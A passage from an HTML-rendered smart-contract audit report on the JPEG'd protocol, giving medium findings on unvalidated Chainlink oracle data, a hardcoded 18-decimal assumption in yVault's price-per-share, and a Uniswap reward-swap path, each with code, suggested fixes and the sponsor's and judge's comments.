3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>typescript</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Declare a new variable <code>totalLPSupply</code> to the struct <code>PoolInfo</code>, and use it instead of <code>pool.lpToken.balanceOf(address(this))</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1095312206\">spaghettieth (JPEG’d) confirmed, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>Very minor issue, severity should be 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1099230941\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/2\">jpegd/core#2</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1109827974\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I’m going to downgrade this to a medium. There is a possibility for lost funds given real world external factors (user stupidity).</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-oracle-data-feed-is-insufficiently-validated\" style=\"position:relative;\"><a href=\"#m-06-oracle-data-feed-is-insufficiently-validated\" aria-label=\"m 06 oracle data feed is insufficiently validated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/54\">[M-06] Oracle data feed is insufficiently validated.</a></h2>\n<p><em>Submitted by Jujic, also found by hickuphh3</em></p>\n<p>Price can be stale and can lead to wrong <code>answer</code> return value.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Oracle data feed is insufficiently validated. There is no check for stale price and round completeness. Price can be stale and can lead to wrong  <code>answer</code>  return value.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _collateralPriceUsd() internal view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        int256 answer = oracle.latestAnswer();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint8 decimals = oracle.decimals();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(answer &gt; 0, &quot;invalid_oracle_answer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ...</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L105\">FungibleAssetVaultForDAO.sol#L105</a><br></p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate data feed</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _collateralPriceUsd() internal view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">(uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = oracle.latestRoundData();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(answer &gt; 0, &quot;invalid_oracle_answer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(answeredInRound &gt;= roundID, &quot;ChainLink: Stale price&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(timestamp &gt; 0, &quot;ChainLink: Round not complete&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         ...</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1101687980\">0xJPEG (JPEG’d) confirmed, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>Can add validation for round not being complete yet and potentially for stale pricing.<br>\nThis should be medium risk, as shown in past contests <a href=\"https://github.com/code-423n4/code423n4.com/blob/65f9f13b7502c264098fe65ab57e79fcf99e956d/_data/reports/2022-01-notional.md#m-01-usage-of-deprecated-chainlink-api-in-eip1271wallet\">[1]</a> <a href=\"https://github.com/code-423n4/code423n4.com/blob/61f7d00561352d0c312b7f516404840eb68c824e/_data/reports/2021-12-yetifinance.md#m-02-should-check-return-data-from-chainlink-aggregators\">[2]</a> <a href=\"https://github.com/code-423n4/code423n4.com/blob/582de04e5765ee1953d0f07968fcd46ee2204ac7/_data/reports/2021-05-fairside.md#m-09-should-check-return-data-from-chainlink-aggregators\">[3]</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1102902675\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/9\">jpegd/core#9</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1109875877\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Agree with sponsor on the medium risk rating. An oracle with a bad value is by definition an external requirement.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-wrong-calculation-for-yvault-price-per-share-if-decimals--18\" style=\"position:relative;\"><a href=\"#m-07-wrong-calculation-for-yvault-price-per-share-if-decimals--18\" aria-label=\"m 07 wrong calculation for yvault price per share if decimals  18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/117\">[M-07] Wrong calculation for <code>yVault</code> price per share if decimals != 18</a></h2>\n<p><em>Submitted by berndartmueller</em></p>\n<p>The <a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L196\">yVault.getPricePerFullShare()</a> function calculates the price per share by multiplying with <code>1e18</code> token decimals with the assumption that the underlying token always has 18 decimals. <code>yVault</code> has the same amount of decimals as it’s underlying token see (<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L70\">yVault.decimals()</a>)</p>\n<p>But tokens don’t always have <code>1e18</code> decimals (e.g. USDC).</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The price per share calculation does not return the correct price for underlying tokens that do not have 18 decimals. This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Following test will fail with the current implementation when the underlying vault token has 6 decimals:</p>\n<p><em>NOTE: <code>units()</code> helper function was adapted to accept the desired decimals.</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;should mint the correct amount of tokens for tokens with 6 decimals&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPricePerFullShare</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPricePerFullShare</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DECIMALS</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p>Fails with following error: <code>AssertionError: Expected \"2000000000000000000\" to be equal 2000000</code></p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended mitigation steps</h3>\n<p>Use vault <code>decimals()</code> instead of hardcoded <code>1e18</code> decimals.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPricePerFullShare</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">())) / </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit-info use `decimals()` instead of hardcoded `1e18`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1097985902\">spaghettieth (JPEG’d) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>The <code>yVault</code> contract has been designed to work with Curve LPs, which have 18 decimals</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1109895569\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I’m downgrading this to a medium risk but leaving it as valid. Any number of external factors could conspire to result in a non-18 decimal token being used in the future, at which point this code may have been forgotten. A better choice would be to do a decimal check.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-_swapuniswapv2-may-use-an-improper-path-which-can-cause-a-loss-of-the-majority-of-the-rewardtokens\" style=\"position:relative;\"><a href=\"#m-08-_swapuniswapv2-may-use-an-improper-path-which-can-cause-a-loss-of-the-majority-of-the-rewardtokens\" aria-label=\"m 08 _swapuniswapv2 may use an improper path which can cause a loss of the majority of the rewardtokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/157\">[M-08] <code>_swapUniswapV2</code> may use an improper <code>path</code> which can cause a loss of the majority of the rewardTokens</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L311-L334\">StrategyPUSDConvex.sol#L311-L334</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">harvest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOutCurve</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STRATEGIST_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">convexConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseRewardPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getReward</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Prevent `Stack too deep` errors</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">DexConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dexConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategyConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weth</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">//minOut is not needed here, we already have it on the Curve deposit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">_swapUniswapV2</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">dex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">uniswapV2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span 